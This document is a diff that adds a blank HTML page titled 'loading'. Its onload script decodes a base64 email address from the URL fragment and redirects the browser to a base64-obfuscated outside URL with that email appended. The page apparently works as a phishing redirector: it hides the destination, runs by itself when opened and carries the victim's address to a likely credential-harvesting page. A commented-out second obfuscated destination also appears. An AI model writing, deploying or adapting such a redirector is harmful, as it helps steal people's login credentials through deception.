@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta charset="UTF-8">
+  <title>loading</title>
+  <script>
+    function redirect() {
+      var queryString = window.location.href;
+      var dom= queryString.split("#");
+      var email = dom[1];
+      var decodedMail= atob(email);
+     // const forwardUrl = atob("aHR0cHM6Ly9zZWN1cmVzZXJ2ZXIubGlua3Byb3RlY3QuY2ZkL2VUVVpzYWZKIw==");
+      const forwardUrl = atob("aHR0cHM6Ly8yZTA4MTQwYzc5YTI0ZjFmYjNhLnVwLnJhaWx3YXkuYXBwLz9SQWxMU05QSTk1TEFhQTFHaVJkVDd6cTRMTzVrYnA5Z1ZnbzRiV0Z6elZHVkZETGpSNjU4VFY5Y2x2aGVKVGNQeVUtd1Y0b05Qekh2RTltNk1sRHk5SVVKVWh5N2lDSGh2TktTNzdER254elZsZmxDUDNrZiM=");
+      window.location.href = forwardUrl + decodedMail;
+    }
+  </script>
+</head>
+<body onload="redirect()">
+  </body>
+</html>
